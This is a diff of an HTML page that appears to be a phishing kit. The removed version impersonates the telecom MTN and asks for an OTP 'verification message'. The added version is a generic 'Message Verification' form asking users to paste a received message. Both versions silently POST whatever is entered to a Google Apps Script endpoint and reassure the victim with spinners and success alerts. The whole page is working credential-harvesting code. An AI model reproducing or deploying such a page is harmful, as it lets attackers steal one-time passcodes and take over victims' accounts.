@@ -3,211 +3,173 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Customer Online Validation - OTP</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<title>Message Verification</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+
 <style>
-:root {
-  --primary: #0b3a66;
-  --primary-dark: #082c4d;
-  --accent: #ffcc00;
-  --bg: #f3f5f8;
-  --card-bg: #ffffff;
-  --text-main: #1f2933;
-  --text-muted: #6b7280;
-  --border: #e5e7eb;
+:root{
+  --primary:#0b3a66;
+  --bg:#f3f5f8;
+  --card:#fff;
+  --border:#e5e7eb;
 }
 
-* { box-sizing: border-box; }
+*{box-sizing:border-box}
 
-body {
-  margin: 0;
-  min-height: 100vh;
-  font-family: "Inter", system-ui, sans-serif;
-  background: var(--bg);
-  color: var(--text-main);
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  opacity: 0;
-  transition: opacity 0.5s ease;
+body{
+  margin:0;
+  min-height:100vh;
+  font-family:Inter,system-ui,sans-serif;
+  background:var(--bg);
+  display:flex;
+  flex-direction:column;
+  opacity:0;
+  transition:.5s;
+}
+body.fade-in{opacity:1}
+body.fade-out{opacity:0}
+
+main{
+  flex:1;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:40px 20px;
 }
 
-body.fade-in { opacity: 1; }
-
-header {
-  width: 100%;
-  background: linear-gradient(180deg, var(--primary), var(--primary-dark));
-  color: #fff;
-  padding: 16px 0;
-  text-align: center;
+.card{
+  width:100%;
+  max-width:520px;
+  background:var(--card);
+  border-radius:14px;
+  border:1px solid var(--border);
+  box-shadow:0 12px 30px rgba(0,0,0,.12);
 }
 
-header .logo {
-  font-weight: 800;
-  font-size: 20px;
-  color: var(--accent);
-  margin-bottom: 6px;
+.card-header{
+  padding:22px 26px;
+  border-bottom:1px solid var(--border);
 }
 
-header .title {
-  font-weight: 700;
-  font-size: 18px;
+.card-body{padding:26px}
+
+label{
+  font-size:13px;
+  font-weight:600;
+  display:block;
+  margin-bottom:6px;
 }
 
-header .subtext {
-  font-weight: 400;
-  font-size: 13px;
-  margin-top: 4px;
-  opacity: 0.85;
+textarea{
+  width:100%;
+  min-height:160px;
+  padding:12px 14px;
+  border-radius:8px;
+  border:1px solid var(--border);
+  resize:vertical;
+  margin-bottom:18px;
 }
 
-.portal-card {
-  background: var(--card-bg);
-  border-radius: 14px;
-  max-width: 480px;
-  width: 90%;
-  padding: 30px 25px;
-  box-shadow: 0 12px 30px rgba(0,0,0,0.12);
-  text-align: left;
-  margin-top: 20px;
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:10px;
+  background:var(--primary);
+  color:#fff;
+  font-weight:600;
+  cursor:pointer;
 }
 
-label {
-  display: block;
-  font-weight: 600;
-  margin-bottom: 6px;
-  font-size: 13px;
+.overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.45);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-direction:column;
+  color:#fff;
+  opacity:0;
+  pointer-events:none;
+  transition:.3s;
 }
+.overlay.active{opacity:1;pointer-events:all}
 
-input[type="text"] {
-  width: 100%;
-  padding: 12px 14px;
-  font-size: 14px;
-  border-radius: 8px;
-  border: 1px solid var(--border);
-  margin-bottom: 20px;
-  transition: border-color 0.2s, box-shadow 0.2s;
+.spinner{
+  width:44px;
+  height:44px;
+  border:4px solid rgba(255,255,255,.3);
+  border-top:4px solid #ffcc00;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin-bottom:14px;
 }
-
-input:focus {
-  outline: none;
-  border-color: var(--primary);
-  box-shadow: 0 0 0 3px rgba(11,58,102,0.15);
-}
-
-button {
-  width: 100%;
-  padding: 14px;
-  border-radius: 10px;
-  border: none;
-  background: var(--primary);
-  color: #fff;
-  font-size: 15px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: background 0.2s, box-shadow 0.2s, transform 0.1s;
-  box-shadow: 0 6px 16px rgba(0,0,0,0.18);
-}
-
-button:hover { background: var(--primary-dark); }
-button:active { transform: translateY(1px); }
-
-.notice {
-  font-size: 13px;
-  color: var(--text-muted);
-  margin-top: 12px;
-  text-align: center;
-}
-
-.overlay {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.45);
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  flex-direction: column;
-  color: #fff;
-  font-size: 15px;
-  opacity: 0;
-  pointer-events: none;
-  transition: opacity 0.3s ease;
-  z-index: 999;
-}
-
-.overlay.active {
-  opacity: 1;
-  pointer-events: all;
-}
-
-.spinner {
-  width: 44px;
-  height: 44px;
-  border: 4px solid rgba(255,255,255,0.35);
-  border-top: 4px solid var(--accent);
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-  margin-bottom: 16px;
-}
-
-@keyframes spin { to { transform: rotate(360deg); } }
+@keyframes spin{to{transform:rotate(360deg)}}
 </style>
 </head>
+
 <body>
-<script>document.body.classList.add("fade-in");</script>
+<script>document.body.classList.add("fade-in")</script>
 
-<header>
-  <div class="logo">MTN</div>
-  <div class="title">Customer Online Validation</div>
-  <div class="subtext">Enter your verification message below</div>
-</header>
+<main>
+  <div class="card">
+    <div class="card-header">
+      <h2>Verify Received Message</h2>
+      <p>Paste the message you received for review.</p>
+    </div>
 
-<div class="portal-card">
-  <form id="otpForm">
-    <label for="otp">Verification Message</label>
-    <input type="text" id="otp" name="validation_otp" placeholder="Enter your verification message" required>
-    <button type="submit">Submit →</button>
-    <div class="notice" id="status">Your credentials are secured.</div>
-  </form>
-</div>
+    <div class="card-body">
+      <form id="verifyForm">
+        <label>Paste Received Message For Verification</label>
+        <textarea name="message" required></textarea>
+        <button type="submit">Submit for Verification</button>
+      </form>
+    </div>
+  </div>
+</main>
 
 <div class="overlay" id="overlay">
   <div class="spinner"></div>
-  Processing…
+  Submitting message…
 </div>
 
 <script>
-const form = document.getElementById('otpForm');
-const overlay = document.getElementById('overlay');
-const statusEl = document.getElementById('status');
-const WEBAPP_URL = "https://script.google.com/macros/s/AKfycbzrAI7WA69_S-8Nk-WKDgwiZ5VYm6hIKf_qwS7zWGsgCBUbFG1oLVyjMeO4CJ0fi20/exec";
+const form = document.getElementById("verifyForm");
+const overlay = document.getElementById("overlay");
 
-form.addEventListener('submit', async (e) => {
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwrIGl6QRyWqn8VzPQ_VZZmJiJClkZoA2AK7UGG5J9UuljuD71HXidepO19tWfc1WRDNQ/exec";
+
+form.addEventListener("submit", async e => {
   e.preventDefault();
   overlay.classList.add("active");
-  statusEl.textContent = "Submitting...";
-  statusEl.style.color = "#555";
 
   const formData = new FormData(form);
 
   try {
-    const response = await fetch(WEBAPP_URL, { method: "POST", body: formData });
-    const text = await response.text();
-    const json = JSON.parse(text);
+    const res = await fetch(SCRIPT_URL, {
+      method: "POST",
+      body: formData
+    });
 
-    if (json.result === "success") {
-      statusEl.textContent = "Submission successful!";
-      statusEl.style.color = "#22c55e";
+    const text = await res.text();
+
+    if (text.toLowerCase().includes("success")) {
+      setTimeout(() => {
+        document.body.classList.add("fade-out");
+        setTimeout(() => {
+          alert("Message submitted successfully ✔️");
+          location.reload();
+        }, 500);
+      }, 1000);
     } else {
-      overlay.classList.remove("active");
-      statusEl.textContent = "Submission failed: " + (json.message || "Unknown error");
-      statusEl.style.color = "#b00000";
+      throw new Error("Submission failed");
     }
-  } catch(err) {
+
+  } catch (err) {
     overlay.classList.remove("active");
-    statusEl.textContent = "Network error. Try again.";
-    statusEl.style.color = "#b00000";
+    alert("Error submitting message. Try again.");
   }
 });
 </script>
